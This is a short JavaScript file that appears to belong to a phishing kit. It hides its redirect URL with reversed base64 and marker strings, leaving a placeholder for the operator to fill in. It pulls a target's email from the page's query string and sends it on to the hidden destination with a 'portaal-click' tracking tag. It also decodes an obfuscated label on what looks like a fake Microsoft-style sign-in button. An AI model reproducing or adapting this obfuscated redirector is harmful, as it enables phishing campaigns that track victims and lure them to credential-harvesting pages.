const BASE_URL =
  "SCW=Y3VMx2YDdmbW12SlFUZM90Ls5..............................E"; // Modifiy

const PREFIX = "SCW";
const SUFFIX = "E";

function dbfst(str) {
  let withoutPrefixSuffix = str.slice(PREFIX.length, -SUFFIX.length);
  let reversed = withoutPrefixSuffix.split("").reverse().join("");
  try {
    return atob(reversed);
  } catch (err) {
    return str;
  }
}

function obfst(str) {
  let encoded = btoa(str);
  let reversed = encoded.split("").reverse().join("");
  return PREFIX + reversed + SUFFIX;
}

function initializePage() {
  const baseUrl = dbfst(BASE_URL);
  const params = new URLSearchParams(window.location.search);
  const encodedEmail = params.get("e");
  const redirectUrl = encodedEmail
    ? baseUrl + "?e=" + encodeURIComponent(encodedEmail) + "&a=portaal-click"
    : baseUrl + "?a=portaal-click";

  const loginBtn = document.getElementById("login-btn");
  if (!loginBtn) {
    // continue
  } else {
    loginBtn.addEventListener("click", () => {
      window.location.href = redirectUrl;
    });
  }

  const msfloginBtn = document.getElementById("msf-login-btn");
  if (!msfloginBtn) {
    return;
  }
  const label = dbfst(msfloginBtn.innerText);
  msfloginBtn.innerHTML = `<img id="lgImg" src="images/logo2.svg"></img>`;
  msfloginBtn.appendChild(document.createTextNode(label));
  msfloginBtn.addEventListener("click", () => {
    window.location.href = redirectUrl;
  });
}

initializePage();
